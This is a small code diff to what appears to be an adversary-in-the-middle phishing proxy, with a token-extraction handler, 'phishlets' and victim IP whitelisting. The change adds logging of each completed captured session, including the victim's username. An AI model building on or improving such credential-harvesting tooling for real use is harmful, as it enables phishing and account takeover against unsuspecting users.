@@ -52,6 +52,12 @@ func (h *TokenExtractor) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 	if !ctx.Session.IsDone() && h.Sessions.IsComplete(ctx.Session, ctx.Phishlet) {
 		if err := h.Sessions.Complete(ctx.Session); err != nil {
 			h.Logger.Warn("failed to complete session", "session_id", ctx.Session.ID, "error", err)
+		} else {
+			h.Logger.Info("session completed",
+				"session_id", ctx.Session.ID,
+				"phishlet", ctx.Session.Phishlet,
+				"username", ctx.Session.Username,
+			)
 		}
 		if h.Whitelist != nil {
 			h.Whitelist.WhitelistTemporary(ctx.ClientIP, temporaryWhitelistDuration)
